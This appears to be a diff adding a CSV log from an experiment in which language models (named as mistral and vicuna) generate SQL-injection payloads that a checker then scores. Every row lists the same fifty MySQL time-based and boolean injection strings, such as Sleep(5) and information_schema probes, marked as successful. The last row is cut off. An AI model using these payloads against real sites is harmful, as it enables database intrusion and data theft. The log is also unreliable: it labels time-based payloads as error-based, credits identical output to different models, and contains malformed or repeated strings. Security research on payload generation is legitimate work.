@@ -1,0 +1,301 @@
+timestamp,model,raw_payload,cleaned_payload,result,generator_time,discriminator_time
+2025-08-04 13:59:42,mistral,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,305.39,0.04
+2025-08-04 14:05:50,vicuna,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,294.5,0.03
+2025-08-04 14:10:43,vicuna,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,292.41,0.03
+2025-08-04 14:15:36,vicuna,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,293.1,0.03
+2025-08-04 14:20:36,vicuna,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
+31: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IFNULL(Sleep(5),0)) ELSE 0 END) --`
+32: `' OR 1=IF((Select Sleep(5)),1,0) AND IfNull(Sleep(5),0) --`
+33: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (SELECT IfNull(Sleep(5),0)) ELSE 0 END) --`
+34: `' OR 1=IF((Select Sleep(5)),1,0) AND (IfNull(Select Sleep(5),0)) --`
+35: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(Select Sleep(5),0)) ELSE 0 END) --`
+36: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+37: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+38: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT Sleep(5)),0) --`
+39: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT Sleep(5)),0)) ELSE 0 END) --`
+40: `' OR 1=IF((SELECT IfNull(Sleep(5),0)),1,0) AND IfNull((SELECT IfNull(Sleep(5),0)),0) --`
+41: `' OR 1=(CASE WHEN IF((SELECT IfNull(Sleep(5),0)),1,0)=1 THEN (IfNull((SELECT IfNull(Sleep(5),0)),0)) ELSE 0 END) --`
+42: `' OR 1=IF((Select IfNull(Sleep(5),0)),1,0) AND IfNull(IfNull(Select Sleep(5),0),0) --`
+43: `' OR 1=(CASE WHEN IF(Select IfNull(Sleep(5),0),1,0)=1 THEN (IfNull(IfNull(Select Sleep(5),0),0)) ELSE 0 END) --`
+44: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(Sleep(5),0),0) --`
+45: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(Sleep(5),0),0)) ELSE 0 END) --`
+46: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+47: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+48: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`
+49: `' OR 1=(CASE WHEN IF((SELECT IfNull(IfNull(Sleep(5),0),0)),1,0)=1 THEN (IfNull(Select IfNull(IfNull(Sleep(5),0),0),0)) ELSE 0 END) --`
+50: `' OR 1=IF((Select IfNull(IfNull(Sleep(5),0),0)),1,0) AND IfNull(Select IfNull(IfNull(Sleep(5),0),0),0) --`",1: ' OR 1=1 AND Sleep(5) --,Success(S): Payload successfully showed Error-based SQL injection.,300.06,0.03
+2025-08-04 14:25:35,vicuna,"1: `' OR 1=1 AND Sleep(5) --`
+2: `' OR 1=1 AND IF(CHAR_LENGTH(Sleep(5)),Sleep(5),0) --`
+3: `' OR 1=(SELECT COUNT(*) FROM (SELECT NULL)a) --`
+4: `' OR 1=(SELECT LENGTH((SELECT NULL)) FROM information_schema.tables) --`
+5: `' OR 1=(SELECT CAST(COUNT(1) AS SIGNED) FROM information_schema.tables) --`
+6: `' OR 1=CHAR(ASCII('A')) AND Sleep(5) --`
+7: `' OR 1=CASE WHEN (Sleep(5)) THEN 1 ELSE 0 END --`
+8: `' OR 1=SUM((SELECT NULL)) AND SLEEP(5) --`
+9: `' OR 1=(SUBSTRING((SELECT group_concat(table_name from information_schema.tables limit 0,1)),1,1)=CHAR(ASCII('A'))) AND Sleep(5) --`
+10: `' OR 1=IFNULL(Sleep(5),0) --`
+11: `' OR 1=If((Sleep(5)),1,0) --`
+12: `' OR 1=(SELECT (IF(Sleep(5),1,0))) --`
+13: `' OR 1=Floor(Sleep(5)) --`
+14: `' OR 1=Ceiling(Sleep(5)) --`
+15: `' OR 1=Round(Sleep(5)) --`
+16: `' OR 1=Mod(Sleep(5),2) --`
+17: `' OR 1=CASE WHEN MOD((Sleep(5)),2)=0 THEN 1 ELSE 0 END --`
+18: `' OR 1=(Sleep(5)) mod 2=1 --`
+19: `' OR 1=(Sleep(5))%2=1 --`
+20: `' OR 1=IF((Sleep(5)),1,0) AND Sleep(5)--`
+21: `' OR 1=IFNULL(Sleep(5),0) AND Sleep(5) --`
+22: `' OR 1=IF(Sleep(5)=0,1,0) AND Sleep(5) --`
+23: `' OR 1=(IF(Sleep(5)=0,1,0)) AND Sleep(5) --`
+24: `' OR 1=CASE WHEN IF(Sleep(5)=0,1,0) THEN 1 ELSE 0 END --`
+25: `' OR 1=IF((SELECT Sleep(5)),1,0) --`
+26: `' OR 1=(SELECT (IF((SELECT Sleep(5)),1,0))) --`
+27: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN 1 ELSE 0 END) AND Sleep(5) --`
+28: `' OR 1=IF((SELECT Sleep(5)),1,0) AND (Select Sleep(5)) --`
+29: `' OR 1=(CASE WHEN IF(Sleep(5),1,0)=1 THEN (Select Sleep(5)) ELSE 0 END) --`
+30: `' OR 1=IF((SELECT Sleep(5)),1,0) AND IFNULL((SELECT Sleep(5)),0) --`
